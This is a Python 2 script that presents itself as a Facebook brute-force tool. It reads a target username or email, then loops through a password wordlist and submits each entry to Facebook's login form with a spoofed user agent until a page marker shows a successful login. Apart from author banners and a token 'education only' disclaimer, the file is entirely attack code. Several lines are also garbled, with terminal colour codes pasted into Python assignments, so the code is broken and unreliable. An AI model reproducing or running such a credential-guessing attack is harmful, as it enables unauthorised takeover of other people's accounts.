#!/usr/bin/python
# -*- coding: utf-8 -*-
        
        
        #############################################
        #                                           #
        #    FACEBOOK BRUTE ATTACK (TARGET 2022)   #
        #    GUTHUB : https://github.com/danishfar    #
        #                                           #
        #############################################
 
 
import time
import os
 
os.system('clear')
time.sleep(0.5)
try:
    import mechanize
except ModuleNotFoundError:
    print '[!] Module >Mechanize< Not Found!\n    This module is only available in python 2.x :/\n    Please install mechanize (pip install mechanize) and run the program with python2'
    exit()
 
print  "\033[1;90m🔀 ⚌⚌⚌⚌⚌⚌⚍⚌⚌⚌⚌⚌⚌⚌⚌⚌⚌⚌⚌⚌⚌⚌⚌⚌⚌⚌⚌⚌⚌⚌⚌⚌⚌⚌⚌⚌⚌⚌⚌⚌⚌⚌⚌⚌ 🔀\033[1;0m"
 
print  "\033[1;92m🔀 FACEBOOK BRUTE FORCE ATTACK ✅" 
print  "\033[1;92m🔀 ALL PASSWORD-LIST UPDATED✅" 
print  "\033[1;92m🔀 ONLY EDUCATION PROMOTE✅" 
print  "\033[1;92m🔀 I AM NOT RESPONSIBILITY FOR YOU✅" 
 
print  "\033[1;90m🔀 ⚌⚌⚌⚌⚌⚌⚍⚌⚌⚌⚌⚌⚌⚌⚌⚌⚌⚌⚌⚌⚌⚌⚌⚌⚌⚌⚌⚌⚌⚌⚌⚌⚌⚌⚌⚌⚌⚌⚌⚌⚌⚌⚌⚌ 🔀\033[1;0m"
 
 
print  "\033[0;35m🔥⚌⚌⚌⚌⚌⚌⚍⚌⚌⚌⚌⚌⚌⚌⚌⚌⚌⚌⚌⚌⚌⚌⚌⚌⚌⚌⚌⚌⚌⚌⚌⚌⚌⚌⚌⚌⚌⚌⚌⚌⚌⚌⚌⚌🔥\033[1;0m" 
print  "\033[1;92m👉 OWNER : TUMISO RSA "
print  "\033[1;92m👉 GITHUB : https://github.com/TumisoRSA" 
print  "\033[1;92m👉 FB PAGE : https://m.facebook.com/Tumiso-tech" 
print  "\033[0;35m🔥⚌⚌⚌⚌⚌⚌⚍⚌⚌⚌⚌⚌⚌⚌⚌⚌⚌⚌⚌⚌⚌⚌⚌⚌⚌⚌⚌⚌⚌⚌⚌⚌⚌⚌⚌⚌⚌⚌⚌⚌⚌⚌⚌⚌🔥\033[1;0m" 
time.sleep(0.5)
user = raw_input('[?] \033[1;95mTarget Username - Email\033[1;94m >>>\033[1;0m')
time.sleep(0.8)
wrdlstFileName = raw_input('\n[?] \033[1;95mType ▶ (abmlist.txt) >>>\033[1;0m')
try:
    wordlist = open(wrdlstFileName, 'r')
except FileNotFoundError:
    print ('\n[!] File Not Found!')
    exit()
 
time.sleep(0.8)
print '\n\nCracking '+user+' Now...'
 
time.sleep(1)
print '\n###############💀 DROIDRSA 💀##############\n'
for password in wordlist:
    if password == '' or password == ' ':
        pass
    else:
        try:
            browser = mechanize.Browser()
            browser.set_handle_robots(False)
            browser.addheaders = [('User-Agent', 'Opera/9.80 (Android; Opera Mini/32.0.2254/85. U; id) Presto/2.12.423 Version/12.16')]
            fb = browser.open('https://facebook.com')
            dos = open('Facebook-Log.txt', 'w+')
            browser.select_form(nr=0)
            browser.form['user'] =\033[1;95m user\033[1;0m     
            browser.form['pass'] =\033[1;95m password\033[1;0m     
            browser.method = 'POST'
            browser.submit()
            dos.write(browser.open('https://facebook.com').read())
            dos.seek(0)
            text = dos.read().decode('UTF-8')
            if text.find('home_icon', 0, len(text)) != -1:
                print '[+] \033[1;95mPassword Found ♥️\033[1;0m'+password 
                dos.close()
                os.system('rm Facebook-Log.txt || del Facebook-Log.txt')
                exit()
            else:
                print "[!] \033[1;94mWrong Password! >>>\033[1;0m"+str(password)
        except KeyboardInterrupt:
            print '\n#############################################\n   Exiting..'
            dos.close()
            os.system('rm Facebook-Log.txt || del Facebook-Log.txt')
            exit()
 
time.sleep(1)
print 'Password is not Cracked👉 Try again 👈.'
time.sleep(0.8)
dos.close()
os.system('rm Facebook-Log.txt || del Facebook-Log.txt')
exit()
 
